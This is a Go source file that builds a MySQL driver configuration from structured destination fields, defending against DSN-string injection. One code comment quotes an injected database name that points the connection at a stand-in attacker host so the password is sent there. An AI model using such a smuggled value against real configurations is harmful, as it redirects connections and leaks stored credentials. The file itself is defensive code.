package sql

import (
	"database/sql/driver"
	"net"
	"sort"
	"strconv"
	"strings"

	"github.com/go-sql-driver/mysql"
)

// mySQLParamEscaper escapes what could change the structure of the parameter string. It is not url.QueryEscape: the
// driver reads some parameters raw (`charset=utf8mb4,utf8` must keep its comma), so everything else is left alone.
var mySQLParamEscaper = strings.NewReplacer("%", "%25", "&", "%26", "=", "%3D", "+", "%2B", " ", "%20")

// mySQLDriverConfig builds the driver config from the structured fields of the destination. User, password, address
// and database are never formatted into a DSN string: that string is split at its last '@' and last '/', so a
// database such as `x@tcp(attacker.example:3306)/events` moved the connection to another server and sent it a password
// starting with the stored one. Only the connection parameters go through the driver's own parser (tls, timeouts,
// charset... are driver options there), in an escaped query string of their own.
func mySQLDriverConfig(config *DataSourceConfig) (*mysql.Config, error) {
	query := ""
	if len(config.Parameters) > 0 {
		names := make([]string, 0, len(config.Parameters))
		for k := range config.Parameters {
			names = append(names, k)
		}
		sort.Strings(names)
		pairs := make([]string, 0, len(names))
		for _, k := range names {
			pairs = append(pairs, mySQLParamEscaper.Replace(k)+"="+mySQLParamEscaper.Replace(config.Parameters[k]))
		}
		query = "?" + strings.Join(pairs, "&")
	}
	cfg, err := mysql.ParseDSN("/" + query)
	if err != nil {
		return nil, err
	}
	cfg.User = config.Username
	cfg.Passwd = config.Password
	cfg.Net = "tcp"
	cfg.Addr = net.JoinHostPort(config.Host, strconv.Itoa(config.Port))
	cfg.DBName = config.Db
	// parsing resolved `tls` against the default address 127.0.0.1 and set the server name to it; let the driver
	// resolve it again now that the address is the real one
	cfg.TLS = nil
	return cfg, nil
}

// mySQLConnector returns the driver connector for the destination, see mySQLDriverConfig.
func mySQLConnector(config *DataSourceConfig) (driver.Connector, error) {
	cfg, err := mySQLDriverConfig(config)
	if err != nil {
		return nil, err
	}
	return mysql.NewConnector(cfg)
}
